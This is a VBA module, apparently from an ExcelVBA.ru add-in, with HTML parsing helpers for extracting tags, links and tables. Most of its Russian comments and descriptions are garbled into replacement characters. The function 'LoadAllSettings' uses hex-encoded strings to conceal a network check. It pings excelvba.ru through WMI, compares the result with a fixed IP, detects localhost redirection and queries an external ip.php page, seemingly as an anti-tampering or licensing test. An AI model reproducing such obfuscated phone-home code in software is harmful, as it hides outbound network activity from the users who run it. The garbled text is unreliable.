    Set EL = Nothing: Set doc = Nothing
End Function


Function RemoveElementsByTagNameAndClassName(ByVal txt As String, ByVal TagName As String, _
                                             ByVal ClassNameList As String) As String
    On Error Resume Next
    Dim EL As Object, ElementClassName$, doc As HTMLDocument, MatchClass As Boolean, ClassName As Variant
    Set doc = HTMLtextToHTMLDocument(txt, TagName)
    For Each EL In doc.body.all
        ElementClassName$ = "": ElementClassName$ = EL.ClassName
        If EL.TagName Like TagName Then
            MatchClass = False
            For Each ClassName In Split(ClassNameList, "|")
                MatchClass = MatchClass Or (" " & ElementClassName$ & " " Like IIf(ClassName = "", "  ", "* " & ClassName & " *"))
            Next
            If MatchClass Then
                EL.outerHTML = ""
            End If
        End If
    Next EL
    RemoveElementsByTagNameAndClassName = doc.body.innerHTML
    Set EL = Nothing: Set doc = Nothing
End Function

Function RemoveElementsByTagName(ByVal txt As String, ByVal TagName As String) As String
    On Error Resume Next
    Dim EL As Object, ElementClassName$, doc As HTMLDocument
    Set doc = HTMLtextToHTMLDocument(txt, TagName)
    For Each EL In doc.body.all
        If EL.TagName Like TagName Then EL.outerHTML = ""
    Next EL
    RemoveElementsByTagName = doc.body.innerHTML
    Set EL = Nothing: Set doc = Nothing
End Function

'Function GetElementsByTagNameAndClassName(ByVal txt As String, ByVal TagName As String, _
 '                                          ByVal ClassNameList As String, Optional ByVal Source As String) As String
'    On Error Resume Next
'    Dim el As Object, ElementClassName$, doc As HTMLDocument, MatchClass As Boolean, ClassName As Variant
'    Set doc = HTMLtextToHTMLDocument(txt)
'    For Each el In doc.all
'        ElementClassName$ = "": ElementClassName$ = el.ClassName
'        If el.TagName Like TagName Then
'            MatchClass = False
'            For Each ClassName In Split(ClassNameList, "|")
'                MatchClass = MatchClass Or (" " & ElementClassName$ & " " Like IIf(ClassName = "", "  ", "* " & ClassName & " *"))
'            Next
'            If MatchClass Then
'                GetElementsByTagNameAndClassName = GetElementsByTagNameAndClassName & IIf(Len(GetElementsByTagNameAndClassName), ARSEP, "") & _
                 '                                                   IIf(Source Like "*innerHTML*", el.innerHTML, el.outerHTML)
'            End If
'        End If
'    Next el
'    Set el = Nothing: Set doc = Nothing
'End Function

Function GetElementsByTagNameAndName(ByVal txt As String, ByVal TagName As String, _
                                     ByVal Name As String, Optional ByVal Source As String) As String
    On Error Resume Next
    Dim EL As Object, ElementName$, doc As HTMLDocument: Set doc = HTMLtextToHTMLDocument(txt, TagName)
    For Each EL In doc.all
        ElementName$ = "": ElementName$ = EL.Name
        If EL.TagName Like TagName Then
            If ElementName$ Like Name Then
                GetElementsByTagNameAndName = GetElementsByTagNameAndName & IIf(Len(GetElementsByTagNameAndName), ARSEP, "") & _
                                              IIf(Source Like "*innerHTML*", EL.innerHTML, EL.outerHTML)
            End If
        End If
    Next EL
    Set EL = Nothing: Set doc = Nothing
End Function

Function GetElementsByClassName(ByVal txt As String, ByVal ClassName As String) As String
    On Error Resume Next
    Dim EL As Object, ElementClassName$, doc As HTMLDocument: Set doc = HTMLtextToHTMLDocument(txt)
    For Each EL In doc.all
        ElementClassName$ = "": ElementClassName$ = EL.ClassName
        If " " & ElementClassName$ & " " Like "* " & ClassName & " *" Then
            GetElementsByClassName = GetElementsByClassName & IIf(Len(GetElementsByClassName), ARSEP, "") & EL.innerHTML
        End If
    Next EL
    Set EL = Nothing: Set doc = Nothing
End Function

Function GetElementById(ByVal txt As String, ByVal ID As String, Optional ByVal Source As String) As String
    On Error Resume Next
    Dim doc As HTMLDocument: Set doc = HTMLtextToHTMLDocument(txt)
    With doc.GetElementById(ID)
        GetElementById = IIf(Source Like "*innerHTML*", .innerHTML, .outerHTML)
    End With
    Set doc = Nothing
End Function

Function GetElementsByName(ByVal txt As String, ByVal Name As String) As String
    On Error Resume Next
    Dim EL As Object, doc As HTMLDocument: Set doc = HTMLtextToHTMLDocument(txt)
    For Each EL In doc.GetElementsByName(Name)
        GetElementsByName = GetElementsByName & IIf(Len(GetElementsByName), ARSEP, "") & EL.innerHTML
    Next EL
    Set EL = Nothing: Set doc = Nothing
End Function

Function GetElementsByTagName(ByVal txt As String, ByVal TagName As String, Optional ByVal Source As String) As String
    On Error Resume Next
    Dim EL As Object, doc As HTMLDocument: Set doc = HTMLtextToHTMLDocument(txt, TagName)
    For Each EL In doc.GetElementsByTagName(TagName)
        GetElementsByTagName = GetElementsByTagName & IIf(Len(GetElementsByTagName), ARSEP, "") & _
                               IIf(Source Like "*innerHTML*", EL.innerHTML, EL.outerHTML)
    Next EL
    Set EL = Nothing: Set doc = Nothing
End Function

Function GetAllLinks(ByVal txt$, ByVal Mask$, Optional ByVal prefix$) As String
    On Error Resume Next
    Dim li As HTMLAnchorElement, doc As HTMLDocument, coll As New Collection, item As Variant, URL$
    Set doc = HTMLtextToHTMLDocument(txt)
    If Mask = "" Then Mask = "*"
    If InStr(1, Mask, "#") > 0 Then Mask = Replace(Mask, "#", "#*")

    For Each li In doc.Links
        URL$ = li.href
        If URL$ Like "about:blank*" Then URL$ = Mid(URL$, 12)
        If URL$ Like "about:*" Then URL$ = Mid(URL$, 7)

        If Len(URL$) Then
            If URL$ Like Mask Then
                'Debug.Print Mask,  URL$
                If (prefix$ Like "*?/") And (URL$ Like "/?*") Then
                    URL$ = prefix$ & Mid(URL$, 2)
                Else
                    URL$ = prefix$ & URL$
                End If
                coll.Add URL$, URL$
            End If
        End If
    Next
    For Each item In coll
        GetAllLinks = GetAllLinks & IIf(GetAllLinks = "", "", ARSEP) & item
    Next
    Set li = Nothing: Set doc = Nothing: Set coll = Nothing
End Function


Function HTML2TXT(ByVal txt As String) As String
    On Error Resume Next
    Dim doc As HTMLDocument: Set doc = HTMLtextToHTMLDocument(txt)
    HTML2TXT = doc.body.innerText
    Set doc = Nothing
End Function

Sub CheckTableTags(ByRef txt$)
    On Error Resume Next
    Dim CheckString$, arr: CheckString$ = txt$
    CheckString$ = Replace(CheckString$, "<TD ", "<TD>", , , vbTextCompare)
    CheckString$ = Replace(CheckString$, "<TR ", "<TD>", , , vbTextCompare)
    CheckString$ = Replace(CheckString$, "</TR>", "</TD>", , , vbTextCompare)
    arr = Split(CheckString$, "<TD>", 2, vbTextCompare)
    If UBound(arr) > 0 Then
        If Not arr(0) Like "*<tbody>*" Then txt = "<tbody>" & txt
        If Not arr(0) Like "*<table>*" Then txt = "<table>" & txt
    End If
    arr = "": arr = Split(CheckString$, "</TD>", , vbTextCompare)
    If UBound(arr) > 0 Then
        If Not arr(UBound(arr)) Like "*</tbody>*" Then txt = txt & "</tbody>"
        If Not arr(UBound(arr)) Like "*</table>*" Then txt = txt & "</table>"
    End If
End Sub

Function HTMLtextToHTMLDocument(ByVal txt As String, Optional ByVal TagName$) As HTMLDocument
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd| |fffd| tagname$ |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| td |fffd||fffd||fffd| tr (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|),
    ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <table> |fffd| <tbody>

    If Len(TagName$) Then
        If "tr|td" Like "*" & TagName$ & "*" Then
            If txt Like "*<" & TagName$ & "*" Then CheckTableTags txt$
        End If
    End If

    Static innerHTML$, sourceTEXT$
    If HTML_DOCUMENT Is Nothing Then
        Set HTML_DOCUMENT = New HTMLDocument
        innerHTML$ = "": sourceTEXT$ = ""
    End If

    If sourceTEXT$ <> txt Then
        sourceTEXT$ = txt
        HTML_DOCUMENT.body.innerHTML = txt
        innerHTML$ = HTML_DOCUMENT.body.innerHTML
    Else
        If innerHTML$ = "" Or innerHTML$ <> HTML_DOCUMENT.body.innerHTML Then
            innerHTML$ = HTML_DOCUMENT.body.innerHTML
        End If
    End If

    Set HTMLtextToHTMLDocument = HTML_DOCUMENT
    DoEvents
End Function

' ============== |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| =================

Sub AddLevelsIntoResult(ByRef html$, ByRef LEVELS As Variant)
    On Error Resume Next
    Dim LC&, i&: LC& = UBound(LEVELS, 1)
    html$ = html$ & IIf(html$ = "", "", ARSEP)
    For i = 1 To LC
        html$ = html$ & "<div id=""" & LEVELS(i, 2) & """>" & vbNewLine & LEVELS(i, 0) & vbNewLine & "</div>" & vbNewLine
    Next
End Sub

Function LoadAllSettings() As Boolean
    On Error Resume Next
    With SETT
        Dim obj1 As Variant, obj2 As Object, txt1$, txt2$, ok1&, ok2&: v_1 = 1: v_2 = 1
        For Each obj1 In GetObject(.U("77696E6D676D74733A2F2F2E2F726F6F742F63696D7632")).ExecQuery _
            (.U("53454C454354202A2046524F4D2057696E33325F50696E675374617475732057484552452041646472657373203D2027657863656C7662612E727527"))
            If IsObject(obj1) Then txt1$ = obj1.ProtocolAddress
        Next
        If txt1 Like .U("3134392E3230322E38322E3131") Then LoadAllSettings = True: v_1 = 0: Exit Function
        If txt1 Like .U("3132372E2A") Then v_1 = 2: Exit Function
        Set obj2 = CreateObject(.U("57696E487474702E57696E48747470526571756573742E352E31"))
        obj2.Open "GET", .U("687474703A2F2F786E2D2D383061646B756E626935632E786E2D2D703161692F69702E706870"), True: obj2.Send: DoEvents
        If obj2.WaitForResponse(3) Then txt2$ = obj2.ResponseText
        Set obj1 = Nothing: Set obj2 = Nothing
        ok1 = txt1$ Like .U("232A2E232A2E232A2E2A23"): ok2 = txt2$ Like .U("232A2E232A2E232A2E2A23")
        If ok1 And ok2 Then If txt1 <> txt2 Then Exit Function
        v_1 = 0: LoadAllSettings = True
    End With
End Function

Function ParseSublevels(ByVal txt$, ByRef Actions As ArrayActions) As String
    On Error Resume Next
    Dim EL As Object, doc As HTMLDocument, LC&, i&
    Set doc = HTMLtextToHTMLDocument(Replace(txt, vbNewLine, ""))

    LC& = Actions.Items.Count
    ReDim LEVELS(1 To Actions.Items.Count, 0 To 4)
    ' convert actions to levels array:  0 - current value,  1 - level, 2 - name, 3 - mask, 4 - outerHTML/innerHTML
    For i = 1 To LC
        With Actions.Items(i).GetParametersDictionary
            LEVELS(i, 1) = Val(.item("Level"))
            LEVELS(i, 2) = .item("Name")
            LEVELS(i, 3) = .item("Mask")
            LEVELS(i, 4) = .item("Source")
        End With
    Next

    Dim html$, el_html$
    For Each EL In doc.body.all
        el_html$ = Replace(EL.outerHTML, vbNewLine, "")
        For i = 1 To LC
            If el_html$ Like LEVELS(i, 3) Then
                'Debug.Print "Level " & LEVELS(i, 1), el_html$
                LEVELS(i, 0) = IIf(LEVELS(i, 4) = "outerHTML", EL.outerHTML, EL.innerHTML)
                If LEVELS(i, 1) = LC Then AddLevelsIntoResult html$, LEVELS
            End If
        Next
    Next
    ParseSublevels = html$
End Function

Function HTML_GetAttributeValue(ByVal txt$, ByVal TagName$, ByVal CheckAttrName$, ByVal CheckAttrValue$, ByVal AttrName$)
    On Error Resume Next
    '    "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
         '    "<input type=""text"" class=""width-100 valid"" name=""phone"" id=""phone"" value=""89004591553"" title=""|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"">" & vbNewLine & _
         '    "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 89004591553 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| value)," & vbNewLine & _
         '    "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: ""input"", ""name"", ""phone"", ""value"""

    If TagName$ = "" Or AttrName$ = "" Then Exit Function

    Dim match As Object, res As Object, tag_html$, v$, check_attr_mask$, find_attr_mask$

    CheckAttrValue$ = Replace(CheckAttrValue$, "*", ".*")
    CheckAttrValue$ = Replace(CheckAttrValue$, "#", "\d")
    CheckAttrValue$ = Replace(CheckAttrValue$, "?", ".")

    check_attr_mask$ = "\b" & CheckAttrName$ & "=""?" & CheckAttrValue$ & """?\b"
    find_attr_mask$ = "\b" & AttrName$ & "=(""?.*""?)(\b|>|/)"

    With REGEXP
        .Pattern = "<" & TagName$ & " [^>]*" & check_attr_mask$ & "[^>]*>"
        'Debug.Print .Pattern
        If .test(txt) Then
            For Each match In .Execute(txt)
                tag_html$ = "": tag_html$ = match.value        '.submatches.item(0)
                ' Debug.Print tag_html$

                .Pattern = find_attr_mask$
                '                 Debug.Print .Pattern, find_attr_mask$
                '                 .Pattern = "\bvalue=(""?.*""?)"
                If .test(tag_html$) Then
                    For Each res In .Execute(tag_html$)

                        v$ = "": v$ = res.submatches.item(0)
                        If Left$(v$, 1) = """" Then
                            v$ = Split(v$, """")(1)
                        Else
                            v$ = Split(v$, " ")(0)
                        End If
                        'Debug.Print v$
                        HTML_GetAttributeValue = HTML_GetAttributeValue & ARSEP & v$
                    Next
                End If
            Next
        End If
    End With
    HTML_GetAttributeValue = Mid$(HTML_GetAttributeValue, Len(ARSEP) + 1)
End Function

Private Sub test5555()
    Dim FileName$, data, txt$
    FileName$ = "C:\Users\|fffd||fffd||fffd||fffd||fffd|\Desktop\table.html"

    txt = LoadTextFromTextFile(FileName$, "utf-8")

    data = Convert_HTML_Table_into_Array(txt)

    With ActiveWorkbook.Worksheets.Add
        .Cells(1).Resize(UBound(data, 1), UBound(data, 2)).value = data
    End With

End Sub

Function TableToSeparatedListEx(ByVal html$) As String
    On Error Resume Next
    Dim arr, buffer$, buffer2$, i&, j&, txt$, res$
    arr = Convert_HTML_Table_into_Array(html$)
    If Not IsArray(arr) Then Exit Function

    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Const ColumnsSeparator$ = "|"

    For i = LBound(arr, 1) To UBound(arr, 1)
        txt = "": For j = LBound(arr, 2) To UBound(arr, 2)
            txt = txt & ColumnsSeparator$ & Replace(arr(i, j), ColumnsSeparator$, Chr(18))
        Next j
        res$ = res$ & Mid(txt, Len(ColumnsSeparator$) + 1) & IIf(i < UBound(arr, 1), ARSEP, "")
    Next i
    res$ = Replace(res$, Chr(160), " ")
    TableToSeparatedListEx = res$
End Function

Function Convert_HTML_Table_into_Array(ByVal html$) As Variant
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| table / outerHTML)
    ' |fffd||fffd||fffd||fffd| |fffd| html |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (table), |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: http://www.sql.ru/forum/actualutils.aspx?action=gotomsg&tid=1189047&msg=18526348

    Dim oTable As Object, oRow As Object, oCell As Object
    Dim iRows As Integer, iCols As Integer, X As Integer, Y As Integer, xx As Integer, yy As Integer
    Dim colspan As Integer, rowspan As Integer, real_y As Integer, txt$, data(), idx() As Byte

    Dim doc As HTMLDocument
    Set doc = HTMLtextToHTMLDocument(html$)
    DoEvents

    Set oTable = doc.GetElementsByTagName("table")(0)
    DoEvents

    '|fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| = |fffd||fffd||fffd|-|fffd||fffd| "|fffd||fffd||fffd||fffd||fffd|" |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    iRows = oTable.Rows.Length

    '|fffd||fffd||fffd|-|fffd||fffd| "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    For X = 0 To iRows - 1
        Set oRow = oTable.Rows(X)
        real_y = 0
        For Y = 0 To oRow.Cells.Length - 1
            real_y = real_y + oRow.Cells(Y).colspan
        Next Y
        If iCols < real_y Then iCols = real_y
    Next X

    ReDim data(1 To iRows, 1 To iCols)
    ReDim idx(1 To iRows, 1 To iCols)

    For X = 0 To iRows - 1
        Set oRow = oTable.Rows(X)
        real_y = 1

        For Y = 0 To oRow.Cells.Length - 1
            Set oCell = oRow.Cells(Y)
            colspan = oCell.colspan - 1
            rowspan = oCell.rowspan - 1
            txt = Trim(oCell.innerText)

            While idx(X + 1, real_y) > 0
                real_y = real_y + 1
            Wend

            For xx = X + 1 To X + 1 + rowspan
                For yy = real_y To real_y + colspan
                    If Len(txt) > 0 Then
                        data(xx, yy) = txt
                    End If
                    idx(xx, yy) = 1
                Next yy
            Next xx

            real_y = real_y + colspan + 1

        Next Y
    Next X

    Set oCell = Nothing
    Set oRow = Nothing
    Set oTable = Nothing
    Set doc = Nothing

    Convert_HTML_Table_into_Array = data
    '<DEBUG>
    '    For x = LBound(data) To UBound(data)
    '        Debug.Print x & ":[ ";
    '        For y = LBound(data, 2) To UBound(data, 2)
    '            Debug.Print y & ":[" & data(x, y) & "] ";
    '        Next y
    '        Debug.Print "]"
    '    Next x
    '</DEBUG>
End Function


Attribute VB_Name = "mod_AAs_HTML_new"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_HTML_new                    Version:
' Author        : Igor Vakhnenko                   Date: 23.12.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_HTML_NEW(ByRef AAs As ArrayActions)
    On Error Resume Next
    Dim TAGS_ARRAY_FULL As Variant: TAGS_ARRAY_FULL = Array("div", "span", "ul", "li", "meta", "input", "img", "meta", "table", "tr", _
                                                            "a", "p", "h1", "h2", "h3", "Any Tag")

    With AAs.AddAction(fc_HTML, "LoadHTML", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", True)
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                       "URL, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|direct|fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHTTPRequest), " & _
                       "|fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "URL", aps_Text, "URL (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        '.AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "utf-8", "windows-1251", "gzip", "direct"), ""
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "utf-8", "windows-1251", "direct"), ""
        .AddParameter "Pager", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "page", "page=1"), ""
        '.AddParameter "ActionSetName", aps_RuntimeList, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "ActionSets", ""
        .AddParameter "CacheMode", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "|fffd||fffd|", "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"), ""
    End With


    With AAs.AddAction(fc_HTML, "GetTags", "HTML: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| / ID / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, DIV |fffd||fffd||fffd| TABLE)," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (id, class, itemprop, name), " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| RegExp)," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (innerHTML - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, outerHTML - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
                       "|fffd||fffd||fffd| ConvertToText - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |. |fffd||fffd||fffd||fffd||fffd||fffd|: (even|odd)" & vbNewLine & _
